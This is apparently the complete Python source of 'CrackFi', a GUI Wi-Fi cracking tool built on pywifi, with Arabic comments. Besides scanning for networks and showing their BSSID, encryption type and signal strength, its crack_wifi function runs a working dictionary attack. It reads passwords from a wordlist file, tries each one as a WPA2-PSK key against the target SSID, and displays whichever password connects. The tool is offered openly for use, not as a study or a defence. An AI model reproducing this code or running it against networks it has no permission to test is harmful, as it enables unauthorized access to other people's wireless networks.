# Project Name : CrackFi
# Version : 1.0.0v

import time
import pywifi
import threading
from pywifi import *
from hacklore import *



def search_wifi():

    information.setText('')
    passowrdStatue.setText('')

    # 2. بناء دالة الخلفية المسؤولة عن التحديث المستمر كل ثانية
    def wifi_scanner_thread():
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        
        print("[*] Continuous Wi-Fi scanning started...")
        
        # حلقة تكرار مستمرة لتحديث الشبكات (تحديث حي)
        while True:
            iface.scan() # أمر كرت الشبكة ببدء البحث
            time.sleep(1) # الانتظار ثانية واحدة لتحديث البيانات
            
            scan_results = iface.scan_results()
            
            # مصفوفة لتخزين الأسماء الفريدة لمنع تكرار نفس اسم الشبكة في القائمة
            discovered_ssids = []
            
            for network in scan_results:
                # تنظيف الاسم من المسافات المخفية
                ssid = network.ssid.strip()
                
                # تخطي الشبكات المخفية (بدون اسم) والشبكات المضافة مسبقاً في هذه الدورة
                if ssid and ssid not in discovered_ssids:
                    discovered_ssids.append(ssid)
            
            # 3. تحديث الـ listView بأسماء الشبكات المكتشفة
            # ملاحظة: إذا كانت مكتبتك المغلّفة تدعم إضافة نصوص أو مصفوفة للـ listView
            # سنفترض أن الدالة اسمها .addItem() أو .add() أو .setItems() حسب برمجتك لها
            
            # هنا نقوم بمسح القائمة القديمة وإضافة القائمة المحدثة
            listView.Clear() 
            for name in discovered_ssids:
                # استبدل .addItem(name) بالدالة الصحيحة في مكتبتك لإضافة عنصر للـ ListView
                listView.add_item(name) 
                
            listView.scrollToBottom() # النزول التلقائي لأسفل السكرول بار الاحترافي
            
            # انتظام التحديث بين كل ثانية والأخرى
            time.sleep(1)

    # 4. تشغيل الدالة في خيط مستقل (Thread) فور النقر على الزر لمنع تجمد الواجهة
    threading.Thread(target=wifi_scanner_thread, daemon=True).start()


def show_wifi_info():

    information.setText('')
    passowrdStatue.setText('')

    target_ssid = wifiName.Get()

    if not target_ssid:
        print("[!] Please enter the network name first.\n")
        return
    
    print(f"[*] Searching for network: {target_ssid}...\n")

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()

    time.sleep(2)

    scan_results = iface.scan_results()

    network_found = None
    for network in scan_results:
        if network.ssid.strip() == target_ssid:
            network_found = network
            break

    if network_found:
        auth_type = "Unknown"
        if network_found.akm[0] == pywifi.const.AKM_TYPE_NONE:
            auth_type = "Open"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPA:
            auth_type = "WPA"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPAPSK:
            auth_type = "WPA-PSK"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPA2:
            auth_type = "WPA2"
        elif network_found.akm[0] == pywifi.const.AKM_TYPE_WPA2PSK:
            auth_type = "WPA2-PSK"

        signal_strength = network_found.signal

        info_text = (
            f"• Name: {network_found.ssid}\n\n"
            f"• Mac Address (BSSID): {network_found.bssid.upper()}\n\n"
            f"• Encryption and security type: {auth_type}\n\n"
            f"• Signal strength: {signal_strength} dBm\n\n\n"
            f"• Network information found successfully."
        )

        information.setText(text=info_text)

    else:
        print("SSID Informations:\n\nThe network was not found.")
        print(f"Terminal Output:\n[-] No signal was captured for this network perimeter. Check name.")


def crack_wifi():

    information.setText('')
    passowrdStatue.setText('')

    show_wifi_info()
    
    listView.Clear()

    target_wifi_name = wifiName.Get()
    target_path = passwordPath.Get()

    if not target_wifi_name or not target_path:
        print("[!] Please select SSID and Password file first.\n")
        return

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    with open(target_path, 'r', encoding='utf-8', errors='ignore') as file:
        for password in file:
            wifi_pass = password.strip()
            if not wifi_pass:
                continue

            iface.disconnect()
            #time.sleep(1)

            profile = pywifi.Profile()
            profile.ssid = target_wifi_name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = wifi_pass

            iface.remove_all_network_profiles()
            temp_profile = iface.add_network_profile(profile)
            iface.connect(temp_profile)
            
            print(f'Trying : [ {wifi_pass} ]')

            listView.add_item(f'Trying : [ {wifi_pass} ]')

            is_connected = False
            for _ in range(10):
                time.sleep(0.5)
                if iface.status() == const.IFACE_CONNECTED:
                    is_connected = True
                    break
                elif iface.status() == const.IFACE_DISCONNECTED and _ > 4:
                    break

            if is_connected:
                print(f'\n[+] Connect successfully [ {wifi_pass} ].')
                passowrdStatue.setText(f"• Connected Successfully.\n• Password: {wifi_pass}")
                return

    print("\n[-] Finished: Password not found in the file.")
    passowrdStatue.setText("• Finished: Password not found in the file.")


def browse():
    select_file = FileDialog()
    select = select_file.openFile(caption='Select Password File Path', filter="Text Files (*.txt)")

    if select:
        passwordPath.setReadOnly(read_only=False)
        passwordPath.setText(select)
        passwordPath.setReadOnly(read_only=True)


app = App()
app.Style(first_style='''background-color: lightgray;''', second_style='''''')

page = Page()
page.Layout(layout_type='v')
page.Align(alignment='top')
page.Margin(left=10, top=50, right=10, bottom=100)
page.Spacing(25)
app.addPage(page=page, title='CrackFi')

wifinameFrame = Frame()
wifinameFrame.Layout(layout_type='h')
wifinameFrame.Margin(left=0, top=0, right=0, bottom=0)
wifinameFrame.Style(first_style='''''', second_style='''''')
page.Add(wifinameFrame)

wifiName = Entry(placeholder_text='Choose The Network Number')
wifinameFrame.addTo(wifiName)

showButton = Button(text='Show info', command=lambda: show_wifi_info())
wifinameFrame.addTo(showButton)

searchButton = Button(text='Search wifi', command=lambda: search_wifi())
wifinameFrame.addTo(searchButton)

crackButton = Button(text='Crack wifi', command=lambda: threading.Thread(target=crack_wifi, daemon=True).start())
wifinameFrame.addTo(crackButton)

passwordFrame = Frame()
passwordFrame.Layout(layout_type='h')
passwordFrame.Margin(left=0, top=0, right=0, bottom=0)
passwordFrame.Style(first_style='''''', second_style='''''')
page.Add(passwordFrame)

passwordPath = Entry(placeholder_text='Select Password File Path')
passwordPath.setReadOnly(read_only=True)
passwordFrame.addTo(passwordPath)

browseButton = Button(text='Browse', command=lambda: browse())
passwordFrame.addTo(browseButton)

boxFrame = Frame()
boxFrame.Layout(layout_type='h')
boxFrame.Margin(left=0, top=0, right=0, bottom=0)
boxFrame.Style(first_style='''''', second_style='''''')
boxFrame.minHeight(min_height=400)
page.Add(boxFrame)

infoFrame = Frame()
infoFrame.Layout(layout_type='v')
infoFrame.Align(alignment='top')
infoFrame.Margin(left=0, top=0, right=0, bottom=0)
infoFrame.Spacing(25)
infoFrame.Style(first_style='''border: 2px solid darkslategrey;''', second_style='''''')
infoFrame.minWidth(min_width=400)
infoFrame.maxWidth(max_width=400)
boxFrame.addTo(infoFrame)

infoLabel = Label(text='Wi-Fi Information')
infoLabel.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; padding-left: 5px; padding-top: 5px; padding-bottom: 2px;''', second_style='''''')
infoFrame.addTo(infoLabel)


information = Label(text='')
information.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 12px; border-top: none; border-bottom: none; padding-left: 5px;''', second_style='''''')
infoFrame.addTo(information)


passowrdStatue = Label(text='')
passowrdStatue.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 12px; border-top: none; border-bottom: none; padding-left: 5px;''', second_style='''''')
infoFrame.addTo(passowrdStatue)


termnalFrame = Frame()
termnalFrame.Layout(layout_type='v')
termnalFrame.Align(alignment='top')
termnalFrame.Margin(left=0, top=0, right=0, bottom=0)
termnalFrame.Style(first_style='''border: 2px solid darkslategrey;''', second_style='''''')
termnalFrame.minWidth(min_width=500)
boxFrame.addTo(termnalFrame)

termnalLabel = Label(text='Termnal Output')
termnalLabel.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; padding-left: 5px; padding-top: 5px; padding-bottom: 2px;''', second_style='''''')
termnalFrame.addTo(termnalLabel)

scrollbar_style = '''
   /* تنسيق شريط التمرير العمودي */
    QScrollBar:vertical {
        border: none;
        background: lightgray;
        width: 10px;
        margin: 0px 0px 0px 0px;
    }
    QScrollBar::handle:vertical {
        background: darkslategrey;
        min-height: 20px;
        border-radius: 5px;
    }
    QScrollBar::handle:vertical:hover {
        background: darkslategrey;
    }
    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
        height: 0px;
    }
    QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
        background: none;
    }

    /* تنسيق شريط التمرير الأفقي */
    QScrollBar:horizontal {
        border: none;
        background: lightgray;
        height: 10px;
        margin: 0px 0px 0px 0px;
    }
    QScrollBar::handle:horizontal {
        background: lightgray;
        min-width: 20px;
        border-radius: 5px;
    }
    QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
        width: 0px;
    }
'''

listView = ListView()
listView.Style(first_style='''color: darkslategrey; font-family: Lucida Console; font-weight: bold; font-size: 14px; border-top: none; outline: none; padding-right: 5px; padding-bottom: 8px;''', second_style=scrollbar_style)
listView.Spacing(5)
listView.scrollToBottom()
termnalFrame.addTo(listView)



app.Mainloop()